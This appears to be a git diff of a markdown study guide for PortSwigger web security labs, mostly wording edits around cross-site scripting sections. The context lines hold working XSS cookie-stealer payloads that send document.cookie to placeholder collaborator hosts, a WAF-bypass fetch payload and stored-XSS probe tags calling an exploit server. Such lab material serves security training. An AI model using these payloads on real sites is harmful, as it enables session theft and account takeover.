@@ -454,7 +454,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
   
 ### OnHashChange  
 
->Below iframe uses **hash** ``` # ``` character at end of the URL to trigger the **OnHashChange** XSS cookie stealer.  
+>Below iframe uses **HASH** `#` character at end of the URL to trigger the **OnHashChange** XSS cookie stealer.  
   
 ```JavaScript
 <iframe src="https://TARGET.net/#" onload="document.location='http://COLLABORATOR.com/?cookies='+document.cookie"></iframe>
@@ -468,7 +468,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 <iframe src="https://TARGET.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ```  
 
->Note: ***Identify*** the vulnerable jquery 1.8.2 version used in the lab with the CSS selector to ***identify*** **hashchange**.  
+>Note: ***Identify*** the vulnerable jquery 1.8.2 version included in the `source code` with the CSS selector action a the **hashchange**.  
 
 ![Hashchange](images/hashchange.png)  
 
@@ -516,7 +516,7 @@ fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computi
 \';document.location=`https://COLLABORATOR.com/?BackTicks=`+document.cookie;//
 ```  
 
->With help from Trevor I made this into cookie stealer payload, using back ticks. Thanks Trevor, here is his Youtube time index = [TJCHacking XSS string escape](https://youtu.be/Aqfl2Rj0qlU?t=598)  
+>With help from Trevor I made this into cookie stealer payload, using back ticks. Thanks Trevor, here is his Youtube walk through [XSS JavaScript String Angle Brackets Double Quotes Encoded Single](https://youtu.be/Aqfl2Rj0qlU?t=598)  
   
 ![fail-escape](images/fail-escape.png)  
   
@@ -532,6 +532,8 @@ ${alert(document.cookie)}
 
 ![xss template literal](images/xss-template-literal.png)  
   
+>I fail to get a working cookie stealer bypassing all the filters for this lab......  
+
 [PortSwigger Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)  
 
 ### XSS WAF Bypass  
@@ -599,7 +601,7 @@ https://TARGET.net/?SearchTerm="+eval(atob("fetch("https://COLLABORATOR.NET/?c="
   
 ### Stored XSS
 
->Use following sample code to ***identify*** stored XSS, if stored input is redirecting victim that click or following the links to our exploit server.  
+>Use the following sample code to ***identify*** stored XSS. If stored input is redirecting victim that click on the links, it send request to exploit server.  
 
 ```HTML
 <img src="https://EXPLOIT.net/img">
@@ -607,7 +609,7 @@ https://TARGET.net/?SearchTerm="+eval(atob("fetch("https://COLLABORATOR.NET/?c="
 <video src="https://EXPLOIT.net/video"></video>
 ```  
   
->Below is log of requests to exploit log server showing which of the above tags worked.  
+>Below log of requests to exploit log server showing which of the above tags worked.  
 
 ![Identify-stored-xss](images/identify-stored-xss.png)  
 
